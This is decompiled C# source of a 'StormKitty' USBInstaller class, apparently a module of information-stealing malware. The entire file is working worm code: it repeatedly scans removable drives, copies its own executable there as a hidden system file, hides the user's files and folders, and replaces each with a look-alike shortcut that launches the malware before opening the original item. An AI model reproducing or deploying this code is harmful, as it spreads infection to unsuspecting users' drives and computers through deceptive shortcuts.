﻿using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Threading;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

namespace StormKitty
{
	// Token: 0x0200006A RID: 106
	internal class USBInstaller
	{
		// Token: 0x06000193 RID: 403 RVA: 0x0000C5C6 File Offset: 0x0000A7C6
		public static void GetUSB()
		{
			if (USBInstaller.mutex.WaitOne(TimeSpan.Zero, true))
			{
				USBInstaller.Driver(true);
				return;
			}
			USBInstaller.Driver(false);
		}

		// Token: 0x06000194 RID: 404 RVA: 0x0000C5E8 File Offset: 0x0000A7E8
		public static void Driver(bool startThread)
		{
			if (startThread)
			{
				USBInstaller.spath = Interaction.Command().Replace("\\\\\\", "\\").Replace("\\\\", "\\");
				USBInstaller.ExecParam(USBInstaller.spath);
				new Thread(new ThreadStart(USBInstaller.USB_boot), 1).Start();
				return;
			}
			USBInstaller.spath = Interaction.Command().Replace("\\\\\\", "\\").Replace("\\\\", "\\");
			USBInstaller.ExecParam(USBInstaller.spath);
		}

		// Token: 0x06000195 RID: 405 RVA: 0x0000C674 File Offset: 0x0000A874
		public static void USB_boot()
		{
			for (;;)
			{
				try
				{
					string[] array = Strings.Split(USBInstaller.DetectUSBDrivers(), "<->", -1, CompareMethod.Binary);
					int num = Information.UBound(array, 1) - 1;
					for (int i = 0; i <= num; i++)
					{
						if (!File.Exists(array[i] + "\\" + Process.GetCurrentProcess().MainModule.ModuleName))
						{
							File.Copy(Assembly.GetExecutingAssembly().Location, array[i] + Process.GetCurrentProcess().MainModule.ModuleName);
							File.SetAttributes(array[i] + "\\" + Process.GetCurrentProcess().MainModule.ModuleName, FileAttributes.Hidden | FileAttributes.System);
						}
						foreach (string path in Directory.GetFiles(array[i]))
						{
							if (Operators.CompareString(Path.GetExtension(path), ".lnk", false) != 0 && Operators.CompareString(Path.GetFileName(path), Process.GetCurrentProcess().MainModule.ModuleName, false) != 0)
							{
								Thread.Sleep(200);
								File.SetAttributes(path, FileAttributes.Hidden | FileAttributes.System);
								USBInstaller.CreateShortCut(Path.GetFileName(path), array[i], Path.GetFileNameWithoutExtension(path), USBInstaller.GetIconoffile(Path.GetExtension(path)));
							}
						}
						foreach (string path2 in Directory.GetDirectories(array[i]))
						{
							Thread.Sleep(100);
							File.SetAttributes(path2, FileAttributes.Hidden | FileAttributes.System);
							USBInstaller.CreateShortCut(Path.GetFileNameWithoutExtension(path2), array[i] + "\\", Path.GetFileNameWithoutExtension(path2), null);
						}
					}
				}
				catch
				{
				}
				Thread.Sleep(5000);
			}
		}

		// Token: 0x06000196 RID: 406 RVA: 0x0000C828 File Offset: 0x0000AA28
		private static void CreateShortCut(string TargetName, string ShortCutPath, string ShortCutName, string Icon)
		{
			try
			{
				USBInstaller.ObjectShell = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("WScript.Shell", ""));
				USBInstaller.ObjectLink = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(USBInstaller.ObjectShell, null, "CreateShortcut", new object[]
				{
					ShortCutPath + "\\" + ShortCutName + ".lnk"
				}, null, null, null));
				NewLateBinding.LateSet(USBInstaller.ObjectLink, null, "TargetPath", new object[]
				{
					ShortCutPath + "\\" + Process.GetCurrentProcess().MainModule.ModuleName
				}, null, null);
				NewLateBinding.LateSet(USBInstaller.ObjectLink, null, "WindowStyle", new object[]
				{
					1
				}, null, null);
				if (Icon == null)
				{
					NewLateBinding.LateSet(USBInstaller.ObjectLink, null, "Arguments", new object[]
					{
						" " + ShortCutPath + "\\" + TargetName
					}, null, null);
					NewLateBinding.LateSet(USBInstaller.ObjectLink, null, "IconLocation", new object[]
					{
						"%SystemRoot%\\system32\\SHELL32.dll,3"
					}, null, null);
				}
				else
				{
					NewLateBinding.LateSet(USBInstaller.ObjectLink, null, "Arguments", new object[]
					{
						" " + ShortCutPath + "\\" + TargetName
					}, null, null);
					NewLateBinding.LateSet(USBInstaller.ObjectLink, null, "IconLocation", new object[]
					{
						Icon
					}, null, null);
				}
				NewLateBinding.LateCall(USBInstaller.ObjectLink, null, "Save", new object[0], null, null, null, true);
			}
			catch
			{
			}
		}

		// Token: 0x06000197 RID: 407 RVA: 0x0000C9B0 File Offset: 0x0000ABB0
		private static string GetIconoffile(string FileFormat)
		{
			string result;
			try
			{
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("Software\\Classes\\", false);
				string text = Conversions.ToString(registryKey.OpenSubKey(Conversions.ToString(Operators.ConcatenateObject(registryKey.OpenSubKey(FileFormat, false).GetValue(""), "\\DefaultIcon\\"))).GetValue("", ""));
				if (!text.Contains(","))
				{
					text += ",0";
				}
				result = text;
			}
			catch
			{
				result = "";
			}
			return result;
		}

		// Token: 0x06000198 RID: 408 RVA: 0x0000CA40 File Offset: 0x0000AC40
		private static string DetectUSBDrivers()
		{
			string text = "";
			foreach (DriveInfo driveInfo in DriveInfo.GetDrives())
			{
				if (driveInfo.DriveType == DriveType.Removable)
				{
					text = text + driveInfo.RootDirectory.FullName + "<->";
				}
			}
			return text;
		}

		// Token: 0x06000199 RID: 409 RVA: 0x0000CA8C File Offset: 0x0000AC8C
		private static void ExecParam(string Parameter)
		{
			if (Operators.CompareString(Parameter, null, false) != 0)
			{
				if (Strings.InStrRev(Parameter, ".", -1, CompareMethod.Binary) > 0)
				{
					Process.Start(Parameter);
					return;
				}
				Interaction.Shell("explorer " + Parameter, AppWinStyle.NormalFocus, false, -1);
			}
		}

		// Token: 0x040000F6 RID: 246
		private static object ObjectShell;

		// Token: 0x040000F7 RID: 247
		private static object ObjectLink;

		// Token: 0x040000F8 RID: 248
		private static string spath;

		// Token: 0x040000F9 RID: 249
		public static readonly Mutex mutex = new Mutex(true, "idDriver");
	}
}
